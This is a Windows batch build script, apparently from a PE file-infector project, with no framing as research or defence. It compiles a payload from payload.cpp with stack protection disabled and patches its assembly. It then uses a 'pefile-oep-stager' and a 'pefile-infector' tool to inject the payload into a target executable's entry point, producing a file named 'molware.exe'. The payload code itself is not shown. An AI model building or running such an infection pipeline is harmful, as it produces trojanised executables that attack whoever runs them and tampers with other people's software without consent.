@echo off
echo Location: %~dp0
echo Target: %~f1

set location=%~dp0
set target=%~f1
set outputLocation=%~f2
set cwd=%cd%

call vcvarsall.bat x86_amd64
mkdir %location%\payload\dist
cd %location%/payload/dist
%location%/cmake-build-debug/pefile-oep-stager.exe %target%
cl.exe /c /FA /GS- ../src/payload.cpp
node.exe %location%/src/asm-fix.js payload.asm output.asm reljump.txt
ml64.exe output.asm /link /entry:AlignRSP
%location%/cmake-build-debug/pefile-infector.exe %target% output.exe molware.exe
copy molware.exe %outputLocation%
cd %cwd%